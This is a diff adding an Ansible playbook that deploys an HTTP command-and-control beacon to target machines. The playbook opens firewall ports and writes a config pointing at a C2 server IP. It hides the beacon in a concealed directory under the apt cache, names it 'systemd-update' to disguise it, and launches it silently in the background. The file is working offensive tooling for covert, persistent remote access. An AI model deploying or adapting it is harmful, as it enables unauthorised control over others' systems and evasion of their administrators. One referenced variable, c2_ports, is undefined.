@@ -1,0 +1,94 @@
+---
+- name: Deploy HTTP Beacon to Target Systems
+  hosts: target
+  become: yes
+  vars:
+    c2_server_url: "http://100.65.2.138:8080"  # Change to your C2 IP
+    beacon_install_path: "/var/cache/apt/archives/.partial"
+    beacon_name: "systemd-update"  # Process name
+    check_in_interval: 60
+
+  tasks:
+
+    - name: Open C2 ports in UFW firewall (Ubuntu/Debian)
+      ufw:
+        rule: allow
+        port: "{{ item }}"
+        proto: tcp
+      loop: "{{ c2_ports }}"
+      when: ansible_os_family == "Debian"
+      ignore_errors: yes
+      
+    - name: Check if Python3 is installed
+      command: which python3
+      register: python_check
+      ignore_errors: yes
+      changed_when: false
+
+    - name: Install Python3 if missing
+      package:
+        name: python3
+        state: present
+      when: python_check.rc != 0
+
+    - name: Ensure multiple ports are accessible (if firewall active)
+      shell: |
+        for port in 8080 8000 8443 9090 443 80; do
+          ufw allow $port/tcp 2>/dev/null || true
+          firewall-cmd --add-port=$port/tcp 2>/dev/null || true
+        done
+      become: yes
+      ignore_errors: yes
+
+    - name: Install pip3 if missing
+      package:
+        name: python3-pip
+        state: present
+
+    - name: Install Python requests library
+      pip:
+        name: requests
+        executable: pip3
+
+    - name: Create hidden directory
+      file:
+        path: "{{ beacon_install_path }}"
+        state: directory
+        mode: '0755'
+
+    - name: Create beacon config file
+      copy:
+        content: |
+          {
+            "c2_url": "{{ c2_server_url }}",
+            "check_in_interval": {{ check_in_interval }},
+            "jitter_percent": 30,
+            "timeout": 10
+          }
+        dest: "{{ beacon_install_path }}/config.json"
+        mode: '0644'
+
+    - name: Copy beacon to target
+      copy:
+        src: ../beacon.py
+        dest: "{{ beacon_install_path }}/beacon.py"
+        mode: '0755'
+
+    - name: Check if beacon is already running
+      shell: "pgrep -f 'python3.*beacon.py'"
+      register: beacon_running
+      ignore_errors: yes
+      changed_when: false
+
+    - name: Start beacon in background
+      shell: "nohup python3 {{ beacon_install_path }}/beacon.py > /dev/null 2>&1 &"
+      when: beacon_running.rc != 0
+
+    - name: Verify beacon is running
+      shell: "pgrep -f 'python3.*beacon.py'"
+      register: verify_beacon
+      changed_when: false
+
+    - name: Display beacon status
+      debug:
+        msg: "Beacon deployed successfully. PID: {{ verify_beacon.stdout }}"
